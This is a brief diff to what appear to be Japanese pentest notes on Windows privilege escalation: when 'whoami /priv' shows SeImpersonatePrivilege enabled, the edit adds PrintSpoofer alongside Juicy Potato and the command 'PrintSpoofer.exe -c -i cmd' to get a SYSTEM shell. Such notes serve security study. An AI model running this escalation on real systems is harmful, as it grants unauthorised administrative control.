@@ -1013,8 +1013,9 @@ ex:
 whoami /priv で、
 SeImpersonatePrivilege   enabled      // Impersonate a client after authentication   
 
-→  Juicy Potato 
+→  PrintSpoofer (or Juicy Potato) 
 
+ PrintSpoofer.exe -c -i cmd
 
 ```
 
